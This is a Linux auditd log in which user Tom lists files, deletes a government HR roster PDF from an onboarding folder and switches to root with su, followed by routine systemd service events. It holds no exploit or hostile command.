type=SYSCALL msg=audit(1789483233.868:379): arch=c000003e syscall=59 success=yes exit=0 a0=555563c90c65 a1=555563c90720 a2=7ffc46c9efc8 a3=0 items=3 ppid=1514 pid=1549 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="sh" exe="/usr/bin/dash" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789483233.868:379): argc=1 a0="/bin/sh"
type=CWD msg=audit(1789483233.868:379): cwd="/home/Tom/Work_Stuff/ONBOARDING"
type=PATH msg=audit(1789483233.868:379): item=0 name="/bin/sh" inode=393419 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789483233.868:379): item=1 name="/bin/sh" inode=393430 dev=08:02 mode=0120777 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789483233.868:379): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789483233.868:379): proctitle="/bin/sh"
type=SYSCALL msg=audit(1789483235.488:380): arch=c000003e syscall=59 success=yes exit=0 a0=55ed9075b928 a1=55ed9075b850 a2=55ed9075b860 a3=8 items=3 ppid=1549 pid=1550 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="ls" exe="/usr/bin/ls" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789483235.488:380): argc=1 a0="ls"
type=CWD msg=audit(1789483235.488:380): cwd="/home/Tom/Work_Stuff/ONBOARDING"
type=PATH msg=audit(1789483235.488:380): item=0 name="/usr/bin/ls" inode=393357 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789483235.488:380): item=1 name="/usr/bin/ls" inode=393357 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789483235.488:380): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789483235.488:380): proctitle="ls"
type=SYSCALL msg=audit(1789483257.580:381): arch=c000003e syscall=59 success=yes exit=0 a0=55ed9075b9c0 a1=55ed9075b8e0 a2=55ed9075b8f8 a3=8 items=3 ppid=1549 pid=1551 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="rm" exe="/usr/bin/rm" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789483257.580:381): argc=2 a0="rm" a1="Gov_HR_Continuity_Emergency_Callout_Roster.pdf"
type=CWD msg=audit(1789483257.580:381): cwd="/home/Tom/Work_Stuff/ONBOARDING"
type=PATH msg=audit(1789483257.580:381): item=0 name="/usr/bin/rm" inode=393364 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789483257.580:381): item=1 name="/usr/bin/rm" inode=393364 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789483257.580:381): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789483257.580:381): proctitle=726D00476F765F48525F436F6E74696E756974795F456D657267656E63795F43616C6C6F75745F526F737465722E706466
type=SYSCALL msg=audit(1789483259.588:382): arch=c000003e syscall=59 success=yes exit=0 a0=55ed9075b970 a1=55ed9075b890 a2=55ed9075b8a8 a3=8 items=3 ppid=1549 pid=1552 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="ls" exe="/usr/bin/ls" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789483259.588:382): argc=2 a0="ls" a1="-la"
type=CWD msg=audit(1789483259.588:382): cwd="/home/Tom/Work_Stuff/ONBOARDING"
type=PATH msg=audit(1789483259.588:382): item=0 name="/usr/bin/ls" inode=393357 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789483259.588:382): item=1 name="/usr/bin/ls" inode=393357 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789483259.588:382): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789483259.588:382): proctitle=6C73002D6C61
type=SYSCALL msg=audit(1789483540.848:383): arch=c000003e syscall=59 success=yes exit=0 a0=5616598d4240 a1=5616598cf890 a2=5616597dc390 a3=3e8b3e06fdcb648 items=3 ppid=770 pid=1557 auid=1000 uid=1000 gid=1000 euid=0 suid=0 fsuid=0 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="su" exe="/usr/bin/su" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="root" SUID="root" FSUID="root" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789483540.848:383): argc=1 a0="su"
type=CWD msg=audit(1789483540.848:383): cwd="/home/Tom/Projects/json-to-csv"
type=PATH msg=audit(1789483540.848:383): item=0 name="/usr/bin/su" inode=391780 dev=08:02 mode=0104755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789483540.848:383): item=1 name="/usr/bin/su" inode=391780 dev=08:02 mode=0104755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789483540.848:383): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789483540.848:383): proctitle="su"
type=USER_AUTH msg=audit(1789483545.156:384): pid=1557 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:authentication grantors=pam_permit acct="root" exe="/usr/bin/su" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_ACCT msg=audit(1789483545.156:385): pid=1557 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="root" exe="/usr/bin/su" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=CRED_ACQ msg=audit(1789483545.156:386): pid=1557 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="root" exe="/usr/bin/su" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=USER_START msg=audit(1789483545.160:387): pid=1557 uid=1000 auid=1000 ses=1 subj=unconfined msg='op=PAM:session_open grantors=pam_env,pam_env,pam_mail,pam_limits,pam_permit,pam_unix,pam_systemd acct="root" exe="/usr/bin/su" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="Tom" AUID="Tom"
type=BPF msg=audit(1789484029.549:388): prog-id=14 op=LOAD
type=BPF msg=audit(1789484029.549:389): prog-id=15 op=LOAD
type=BPF msg=audit(1789484029.549:390): prog-id=16 op=LOAD
type=SERVICE_START msg=audit(1789484029.629:391): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=systemd-timedated comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=BPF msg=audit(1789484059.409:392): prog-id=17 op=LOAD
type=BPF msg=audit(1789484059.409:393): prog-id=18 op=LOAD
type=BPF msg=audit(1789484059.409:394): prog-id=19 op=LOAD
type=SERVICE_START msg=audit(1789484059.497:395): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=systemd-hostnamed comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789484059.665:396): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=systemd-timedated comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=BPF msg=audit(1789484059.681:397): prog-id=16 op=UNLOAD
type=BPF msg=audit(1789484059.681:398): prog-id=15 op=UNLOAD
type=BPF msg=audit(1789484059.681:399): prog-id=14 op=UNLOAD
type=BPF msg=audit(1789484070.393:400): prog-id=20 op=LOAD
type=BPF msg=audit(1789484070.393:401): prog-id=21 op=LOAD
type=BPF msg=audit(1789484070.393:402): prog-id=22 op=LOAD
type=SERVICE_START msg=audit(1789484070.473:403): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=systemd-timedated comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789484089.533:404): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=systemd-hostnamed comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=BPF msg=audit(1789484089.569:405): prog-id=19 op=UNLOAD
type=BPF msg=audit(1789484089.569:406): prog-id=18 op=UNLOAD
type=BPF msg=audit(1789484089.569:407): prog-id=17 op=UNLOAD
type=SERVICE_STOP msg=audit(1789484100.509:408): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=systemd-timedated comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=BPF msg=audit(1789484100.521:409): prog-id=22 op=UNLOAD
type=BPF msg=audit(1789484100.521:410): prog-id=21 op=UNLOAD
type=BPF msg=audit(1789484100.521:411): prog-id=20 op=UNLOAD
